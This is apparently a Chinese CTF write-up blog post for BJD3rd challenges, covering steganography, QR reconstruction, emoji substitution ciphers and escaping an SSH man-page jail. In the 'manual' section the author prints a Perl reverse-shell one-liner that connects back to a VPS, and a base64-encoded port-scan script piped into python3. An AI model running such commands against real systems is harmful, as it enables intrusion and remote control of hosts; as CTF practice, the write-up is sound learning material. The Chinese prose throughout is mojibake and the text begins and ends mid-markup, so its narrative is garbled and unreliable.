class="number">0</span>,[[<span class="number">353762320</span>,<span class="literal">null</span>,<span class="number">0</span>,<span class="literal">null</span>,[[<span class="number">4</span>,<span class="number">302</span>,[<span class="string">"Jingweizhai|jingweizhai"</span>]</span><br><span class="line">,<span class="string">"04e9"</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,[[<span class="string">"11ym4QgB0WEymoJXlmFy7FTC5Eyd5rV1adBbw6vWN5PmXvw"</span>,<span class="literal">null</span>,[<span class="number">740</span>,<span class="number">555</span>,<span class="number">0</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,[<span class="number">1916058196</span>,<span class="string">"Which PARK is this?"</span>,<span class="literal">null</span>,<span class="number">0</span>,[[<span class="number">901636349</span>,<span class="literal">null</span>,<span class="number">0</span>,<span class="literal">null</span>,[[<span class="number">4</span>,<span class="number">302</span>,[<span class="string">"Jingshan|jingshan"</span>]</span><br><span class="line">,<span class="string">"8009"</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,[[<span class="string">"16pfH3k5-5kDo-Rb9BxeKRvx0S-Qy4IgUdlX8iJ0AUOBIwQ"</span>,<span class="literal">null</span>,[<span class="number">740</span>,<span class="number">554</span>,<span class="number">0</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,[<span class="number">1044111735</span>,<span class="string">"Which DISTRICT is the No.3 of Beijing?"</span>,<span class="string">"The restaurant in question4 is in this Distric"</span>,<span class="number">0</span>,[[<span class="number">1620980704</span>,<span class="literal">null</span>,<span class="number">0</span>,<span class="literal">null</span>,[[<span class="number">4</span>,<span class="number">302</span>,[<span class="string">"Chaoyang|chaoyang"</span>]</span><br><span class="line">,<span class="string">"98ecf8"</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,[[<span class="string">"1VbfGqSSHlM9D_HY1TsENa6rle3axBYbtKdyHS_klYDLG5g"</span>,<span class="literal">null</span>,[<span class="number">740</span>,<span class="number">371</span>,<span class="number">0</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,[<span class="number">1877231084</span>,<span class="string">"Which part of the Great Wall is this?"</span>,<span class="string">"In Huairou Distric"</span>,<span class="number">0</span>,[[<span class="number">1337434564</span>,<span class="literal">null</span>,<span class="number">0</span>,<span class="literal">null</span>,[[<span class="number">4</span>,<span class="number">302</span>,[<span class="string">"Hefangkou|hefangkou"</span>]</span><br><span class="line">,<span class="string">"427e"</span>]</span><br></pre></td></tr></table></figure><p>flagä¸ºç­”æ¡ˆåé¢æ‹¼èµ·æ¥çš„å­—ç¬¦ï¼šd41d8cd98f00b204e9800998ecf8427e</p><hr><h3 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h3><p>æ‰“å¼€ç½‘å€ï¼Œä¸€å¼ å›¾ï¼Œä¸‹è½½zipï¼Œå¯†ç è¯´æ˜¯é‚£ä¸ªpassword_is_here<img src="https://i.loli.net/2020/05/23/67DIfmYgjRL4cCN.png" alt></p><p>ç„¶åF12å‘ç°</p><p><img src="https://i.loli.net/2020/05/23/9MsAQykx1nlDcdX.png" alt></p><p>äºæ˜¯æƒ³åˆ°å¯èƒ½æ˜¯å®½å­—èŠ‚éšå†™ï¼Œç„¶åæ‰¾åˆ°åœ¨çº¿å·¥å…·<a href="https://offdev.net/demos/zwsp-steg-js" target="_blank" rel="noopener">ç½‘ç«™</a>è§£å¯†ï¼Œå¾—åˆ°<code>zerowidthcharactersinvisible</code>ï¼Œè§£å‹åå¾—åˆ°ä¸€å¼ å€’å™çš„å›¾ï¼Œè„šæœ¬ä¸€æŠŠæ¢­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = open(<span class="string">'f14g.png'</span>,<span class="string">'rb'</span>).read()</span><br><span class="line">f = a[::<span class="number">-1</span>]</span><br><span class="line">b = open(<span class="string">'flag.png'</span>,<span class="string">'wb'</span>).write(f)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€å †å¥‡æ€ªå­—ç¬¦</p><p><img src="https://i.loli.net/2020/05/23/7I9ohuP5EpLb31g.png" alt></p><p>å‰ä¸‰ä¸ªæ˜¯MINIMOYS, 4-6æ˜¯é“¶æ²³å¯†ç ï¼Œ7-9æ˜¯è·³èˆçš„å°äººï¼Œæœ€åä¸¤ä¸ªæ˜¯é¸Ÿå›¾è…¾</p><p>å¾—åˆ°</p><p>UVWHZAITWAU</p><p>æ‰€ä»¥flagï¼šMD5(â€˜BJD{UVWHZAITWAU}â€™)</p><hr><h3 id="bin-cat-2"><a href="#bin-cat-2" class="headerlink" title="/bin/cat 2"></a>/bin/cat 2</h3><p>è¿›å»åæ˜¯ä¸€å¼ å¤§çš„å›¾ç‰‡ï¼Œé‡Œé¢æœ‰å¾ˆå¤š å°çš„å›¾ç‰‡ï¼Œå°çš„å›¾ç‰‡æœ‰ä¸¤ç§ã€‚</p><p>ç„¶åå¦‚æœå°†é¡µé¢ç¼©å°ï¼Œå¯ä»¥éšçº¦çœ‹åˆ°ä¸€ä¸ªäºŒç»´ç </p><p>æ‰€ä»¥æ–¹æ³•ä¸€ï¼šå†™è„šæœ¬è„šæœ¬ï¼Œç„¶åç”ŸæˆäºŒç»´ç ï¼Œå†å°†å›¾ç‰‡æ›¿æ¢â€”â€”é•¿åº¦å‡ä¸€åŠï¼Œæ‰«äºŒç»´ç åmd5å³å¯</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">p1 = Image.open(<span class="string">'11.png'</span>).convert(<span class="string">'RGB'</span>)<span class="comment">#ç¬¬ä¸€ç§ç±»å‹çš„å›¾ç‰‡</span></span><br><span class="line">p2 = Image.open(<span class="string">'12.png'</span>).convert(<span class="string">'RGB'</span>)<span class="comment">#ç¬¬äºŒç§ç±»å‹çš„å›¾ç‰‡</span></span><br><span class="line">a,b = p1.size</span><br><span class="line">dif = []</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(b):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(a):</span><br><span class="line">        <span class="keyword">if</span> p1.getpixel((x,y))!=p2.getpixel((x,y)):</span><br><span class="line">            dif.append((x,y))</span><br><span class="line">mark = dif[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">p = Image.open(<span class="string">'res.png'</span>).convert(<span class="string">'RGB'</span>)<span class="comment">#æœ€å¤§çš„ä¸€å¼ å›¾ç‰‡</span></span><br><span class="line">aa,bb = p.size</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>,bb,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,aa,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">if</span> p.getpixel((x+mark[<span class="number">0</span>],y+mark[<span class="number">1</span>])) == p1.getpixel(mark):</span><br><span class="line">            data.append(<span class="string">'1'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data.append(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">B = Image.new(<span class="string">'L'</span>,(<span class="number">10</span>,<span class="number">10</span>),<span class="number">255</span>)</span><br><span class="line">W = Image.new(<span class="string">'L'</span>,(<span class="number">10</span>,<span class="number">10</span>),<span class="number">0</span>)</span><br><span class="line">np = Image.new(<span class="string">'L'</span>,(<span class="number">290</span>,<span class="number">290</span>),<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">29</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">29</span>):</span><br><span class="line">        <span class="keyword">if</span> data[x+<span class="number">29</span>*y] == <span class="string">'0'</span>:</span><br><span class="line">            np.paste(B,(<span class="number">10</span>*x,<span class="number">10</span>*y))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            np.paste(W,(<span class="number">10</span>*x,<span class="number">10</span>*y))</span><br><span class="line">np.save(<span class="string">'r.png'</span>)</span><br><span class="line">pp = Image.open(<span class="string">'r.png'</span>)</span><br><span class="line">barcodes = decode(pp)</span><br><span class="line"><span class="keyword">for</span> barcode <span class="keyword">in</span> barcodes:</span><br><span class="line">    barcodeData = barcode.data.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    print(hashlib.md5(barcodeData.encode()).hexdigest())</span><br></pre></td></tr></table></figure><p>æ–¹æ³•äºŒï¼šç›´æ¥æˆªå›¾ï¼Œç„¶åæ”¾è¿›Stegsolveï¼Œæ”¹ä¸€ä¸‹è‰²é“å¯ä»¥å¾—åˆ°</p><p><img src="https://i.loli.net/2020/05/24/k7LxYFi5AZMs9cz.jpg" alt>ç„¶åæ”¹ä¸€ä¸‹å®½é«˜ï¼Œå°±èƒ½æ‰«å‡ºæ¥äº†ï¼ˆæ”¯ä»˜å®æ‰«ç èƒ½åŠ›æ¯”è¾ƒå¼ºï¼‰ã€‚</p><hr><h3 id="manual"><a href="#manual" class="headerlink" title="manual"></a>manual</h3><p>é¦–å…ˆsshé“¾æ¥ï¼Œå¾—åˆ°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">% ssh ctf@183.129.189.60 -p 10128</span><br><span class="line"></span><br><span class="line">Welcome to BJD3rd Games ~</span><br><span class="line"></span><br><span class="line">ğŸ€ğŸ¾ğŸŒ´ğŸšœğŸ‹ğŸŠğŸ‡ğŸ‚ğŸ“ğŸ‘ğŸˆğŸŸğŸ’ğŸšŸğŸ—</span><br><span class="line"></span><br><span class="line">The above login passwd is encrypted.</span><br><span class="line"></span><br><span class="line">leads:</span><br><span class="line"> - http://emoji.taqini.space</span><br><span class="line"> - suika</span><br><span class="line"></span><br><span class="line">Try to figure out <span class="built_in">where</span> is your</span><br><span class="line"></span><br><span class="line">         <span class="comment">#           #####   #####  </span></span><br><span class="line"><span class="comment">######  ##     ##   #     # #     #</span></span><br><span class="line"><span class="comment">#      # #    #  #  #     #       #</span></span><br><span class="line"><span class="comment">#####    #   #    #  ######    ###  </span></span><br><span class="line"><span class="comment">#        #   ######       #    #    </span></span><br><span class="line"><span class="comment">#        #   #    # #     #         </span></span><br><span class="line"><span class="comment">#      ##### #    #  #####     #    </span></span><br><span class="line">                                    </span><br><span class="line">p.s. Maybe you have lots of xiaowenhao after login,</span><br><span class="line">     I will <span class="built_in">help</span> u look up the manual pages of flag.</span><br><span class="line"></span><br><span class="line">Now, input passwd to start the game:</span><br></pre></td></tr></table></figure><p>ä¸Šé¢é‚£ä¸ªç½‘å€å°±æ˜¯è™ç¬¦miscä¸­çš„emojiæ›¿ä»£åŠ å¯†ï¼Œå¯†é’¥æ˜¯<code>suika</code>ï¼Œä»–æ˜¯ä¸€ç§æ›¿ä»£åŠ å¯†ï¼Œå»ç½‘å€å¾—åˆ°å­—å…¸åè„šæœ¬æ›¿ä»£å¾—åˆ°sshå¯†ç ï¼š<code>C0dEmOj!so4UnNy</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">'ğŸŒ·ğŸ‘±ğŸŒ ğŸŒ´ğŸ‘·ğŸ†ğŸ€ğŸ‘¼ğŸ‰ğŸ‡ğŸ‘°ğŸğŸ‹ğŸ’ğŸ‘ğŸğŸš¶ğŸğŸ“ğŸ’‘ğŸ€ğŸ„ğŸ’ªğŸ³ğŸ—ğŸ‘†ğŸ˜¶ğŸš˜ğŸ€ğŸ˜®ğŸšœğŸ»ğŸ˜´âš“ğŸ”ğŸ˜ğŸš¢ğŸ¥ğŸ˜•ğŸšŸğŸŠğŸ˜ğŸš¥ğŸ‰ğŸ˜­ğŸš½ğŸŸğŸ˜©âŒ›ğŸšğŸ˜³â˜€ğŸ˜œğŸ˜€ğŸš†ğŸˆğŸ˜„ğŸšŠğŸ´ğŸ˜ŠğŸšŒğŸ¾ğŸ‚ğŸªğŸšğŸ—ğŸ˜šğŸŒ¹ğŸš“ğŸğŸ˜‘ğŸš—ğŸ‘©ğŸ˜¥'</span></span><br><span class="line">b = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+'</span></span><br><span class="line">ss = <span class="string">'ğŸ€ğŸ¾ğŸŒ´ğŸšœğŸ‹ğŸŠğŸ‡ğŸ‚ğŸ“ğŸ‘ğŸˆğŸŸğŸ’ğŸšŸğŸ—'</span></span><br><span class="line">print(ss.translate(str.maketrans(a,b)))</span><br></pre></td></tr></table></figure><p>ç™»å½•ä¸Šå»åæ˜¯ä¸€ä¸ªç•™è¨€æ¿åŠ ä¸Šä¸€ä¸ªè‡ªå¸¦çš„man flagæŒ‡ä»¤ï¼Œä½†æ˜¯ä½ ä¸èƒ½é€€å‡ºmanï¼Œé€€å‡ºmançš„è¯å°±ç›´æ¥é€€å‡ºäº†sshï¼Œä½†æ˜¯è¿™ä¸ªmanåˆä¸æ˜¯ä¸€èˆ¬çš„manï¼Œä»–æ˜¯w3mmanï¼Œç„¶åä¸Šé¢çš„<code>External Program Settings</code>ä¸­çš„<code>External browser</code>å¯ä»¥å‘½ä»¤æ‰§è¡Œï¼ˆè¿™ç›¸å½“äºæ˜¯é»˜è®¤å¯åŠ¨é¡¹ï¼Œå¯ä»¥æ’å…¥æŒ‡ä»¤è®©å®ƒæ‰§è¡Œï¼‰ï¼Œä½¿ç”¨perlæ¥åå¼¹shellï¼Œäºæ˜¯æ„å»ºï¼ˆç½‘ä¸Šç™¾åº¦ï¼‰å¾—<code>perl -e &#39;use Socket;$i=&quot;ip addr&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</code>ï¼Œå°†shellåå¼¹åˆ°VPSä¸Šï¼Œç„¶åå¼€å§‹ç–¯ç‹‚æŸ¥çœ‹æ–‡ä»¶ä»¥åŠæƒé™ï¼Œå¾—åˆ°<code>f1a9.py</code>ä¸º700æƒé™ï¼Œhintåˆè¯´ä¸ç”¨ææƒï¼Œç„¶åçœ‹è§run.shé‡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"ctf:C0dEmOj!so4UnNy"</span> | chpasswd</span><br><span class="line">chown -R root:ctf /home/ctf/</span><br><span class="line">chmod 700 /home/ctf/f1a9.py</span><br><span class="line">chmod 750 /home/ctf/msh</span><br><span class="line">/home/ctf/f1a9.py &amp;</span><br><span class="line"></span><br><span class="line">/usr/sbin/sshd -D</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°f1a9.pyåœ¨å¯åŠ¨æ˜¯å°±åœ¨åå°è¿è¡Œäº†ï¼Œä½†æ˜¯ã€‚ã€‚ã€‚æˆ‘psæ€ä¹ˆå¼„ï¼Œè¿›å…¥<code>/proc</code>è¯»å†…å­˜éƒ½æ²¡æ‰¾åˆ°æœ‰ç”¨ä¿¡æ¯ï¼Œä½†æ˜¯å®˜æ–¹çªç„¶ç»™hintï¼š<code>f1a9.pyçš„ç‹¬ç™½ï¼šæˆ‘çš„çœŸå®èº«ä»½æ˜¯web server</code>,äºæ˜¯æ¶å‘èƒ†è¾¹ç”Ÿï¼Œä¿ºçˆ†ç ´ä½ ç«¯å£ï¼Œä½†æ˜¯åˆå› ä¸ºæœåŠ¡å™¨é‡Œæ²¡æœ‰nmapç­‰å¯ä»¥ä¸‰å¥è¯ä»£ç ï¼Œä½¿ç”¨pythonå†™è¿›å»ä¸€å¥è¯çš„æ‰«æç«¯å£è„šæœ¬</p><p>åŸç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">host = <span class="string">' http://127.0.0.1'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2000</span>,<span class="number">2500</span>):</span><br><span class="line">    add = host+<span class="string">':'</span>+str(i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = requests.get(add)</span><br><span class="line">        print(i)</span><br><span class="line">        print(s.text)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>ä¸€å¥è¯è„šæœ¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> aW1wb3J0IHJlcXVlc3RzCmhvc3QgPSAnIGh0dHA6Ly8xMjcuMC4wLjEnCmZvciBpIGluIHJhbmdlKDIwMDAsMjUwMCk6CiAgICBhZGQgPSBob3N0Kyc6JytzdHIoaSkKICAgIHRyeToKICAgICAgICBzID0gcmVxdWVzdHMuZ2V0KGFkZCkKICAgICAgICBwcmludChpKQogICAgICAgIHByaW50KHMudGV4dCkKICAgICAgICBleGl0KDEpCiAgICBleGNlcHQ6CiAgICAgICAgcHJpbnQoaSkKICAgICAgICBwYXNzCg== | base64 -d | python3</span><br></pre></td></tr></table></figure><p>å¾—åˆ°äº†2333ç«¯å£æœ‰ç½‘é¡µï¼Œå…¶å†…å®¹ä¸ºä¸€å †base64ç¼–ç ï¼š</p><p><img src="https://i.loli.net/2020/05/24/S6jkb9qFs2yhru4.png" alt="base64"></p><p>çœ‹åˆ°è¿™ä¹ˆå¤šbase64ï¼Œæœ‰å¯èƒ½å°±æ˜¯base64éšå†™ï¼Œè„šæœ¬ä¸€æŠŠæ¢­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span><span class="params">(s1,s2)</span>:</span></span><br><span class="line">    table = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s1)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> abs(table.index(s1[i]) - table.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">()</span>:</span></span><br><span class="line">    lines = open(<span class="string">'stego.txt'</span>,<span class="string">'r'</span>).readlines()</span><br><span class="line">    bin_str = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        steg_line = line.replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">        <span class="comment"># print(steg_line)</span></span><br><span class="line">        norm_line = base64.b64encode(base64.b64decode(steg_line)).decode()</span><br><span class="line">        <span class="comment"># print(norm_line)</span></span><br><span class="line">        diff = get_base64_diff_value(steg_line,norm_line)</span><br><span class="line">        <span class="comment"># print(diff)</span></span><br><span class="line">        pad_num = steg_line.count(<span class="string">'='</span>)</span><br><span class="line">        <span class="keyword">if</span> diff:</span><br><span class="line">            bin_str += bin(diff)[<span class="number">2</span>:].zfill(pad_num*<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bin_str += <span class="string">'0'</span> * pad_num * <span class="number">2</span></span><br><span class="line">    print(bin_str)</span><br><span class="line">    res_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(int(len(bin_str)/<span class="number">8</span>)):</span><br><span class="line">        <span class="comment"># print(8*j,(j+1)*8)</span></span><br><span class="line">        res_str+=chr(int(bin_str[<span class="number">8</span>*j:(j+<span class="number">1</span>)*<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">    print(res_str[<span class="number">-52</span>:])</span><br><span class="line">    print(base64.b64decode(res_str[<span class="number">-52</span>:]))</span><br><span class="line"></span><br><span class="line">solve()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°hTtP://999.TaQini.SpAcEï¼Œä¸Šå»åæ˜¯</p><p><img src="https://i.loli.net/2020/05/23/VC6HvEDeI2PFWAy.png" alt></p><p>è¿™ç©æ„ï¼Œf12åå‘ç°æœ‰ä¸€å †å¥‡æ€ªçš„è¡¨æƒ…jsï¼š</p><p><img src="https://i.loli.net/2020/05/24/lSd1q9EgKaILkDw.png" alt="js"></p><p>ç½‘ä¸Šåœ¨çº¿è§£å¯†aaencodeå¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* åŠå¾„ï¼Œç”»å¸ƒå®½åº¦ï¼Œç”»å¸ƒé«˜åº¦ï¼Œç”»å¸ƒxå†…è¾¹è·ï¼Œç”»å¸ƒyå†…è¾¹è·</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> R = <span class="number">26</span>, canvasWidth = <span class="number">400</span>, canvasHeight = <span class="number">320</span>, OffsetX = <span class="number">30</span>, OffsetY = <span class="number">30</span>;</span><br><span class="line"><span class="keyword">var</span> circleArr = [];</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">createCirclePoint</span><span class="params">(diffX, diffY)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> row = <span class="number">0</span>; row &lt; <span class="number">3</span>; row++) &#123;</span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">var</span> col = <span class="number">0</span>; col &lt; <span class="number">3</span>; col++) &#123;</span><br><span class="line">      <span class="comment">// è®¡ç®—åœ†å¿ƒåæ ‡</span></span><br><span class="line">       <span class="keyword">var</span> Point = &#123;</span><br><span class="line">         X: (OffsetX + col * diffX + ( col * <span class="number">2</span> + <span class="number">1</span>) * R),</span><br><span class="line">         Y: (OffsetY + row * diffY + (row * <span class="number">2</span> + <span class="number">1</span>) * R)</span><br><span class="line">       &#125;;</span><br><span class="line">       circleArr.push(Point);</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> window.onload = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">var</span> canvas = document.getElementById(<span class="string">"lockCanvas"</span>);</span><br><span class="line">   canvasWidth = document.body.offsetWidth;<span class="comment">//ç½‘é¡µå¯è§åŒºåŸŸå®½</span></span><br><span class="line">   canvas.width = canvasWidth;</span><br><span class="line">   canvas.height = canvasHeight;</span><br><span class="line">   <span class="keyword">var</span> ctx = canvas.getContext(<span class="string">"2d"</span>);</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * æ¯è¡Œ3ä¸ªåœ†</span></span><br><span class="line"><span class="comment">    * OffsetXä¸ºcanvas 